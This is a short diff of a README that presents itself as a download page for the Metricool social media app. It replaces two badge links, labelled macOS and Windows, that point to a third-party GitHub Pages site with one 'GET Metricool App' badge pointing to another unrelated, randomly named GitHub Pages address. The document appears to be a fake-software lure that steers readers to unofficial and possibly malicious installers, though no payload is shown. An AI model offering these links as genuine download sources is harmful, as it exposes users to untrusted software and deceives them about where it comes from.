@@ -1,18 +1,7 @@
 # Metricool Download — Social Media Platform
 
-<a href="https://git-apps-io.github.io/.github/?offer=Metricool" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Metricool%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="Metricool for macOS">
-</a>
+[![GET Metricool App](https://img.shields.io/badge/GET%20%E2%80%94%20Metricool-App-0078D6?style=for-the-badge&logoColor=white)](https://szumigalavorce90.github.io/.github/Metricool-App)
 
-<a href="https://git-apps-io.github.io/.github/?offer=Metricool" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Metricool%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="Metricool for Windows">
-</a>
 
 ---
 
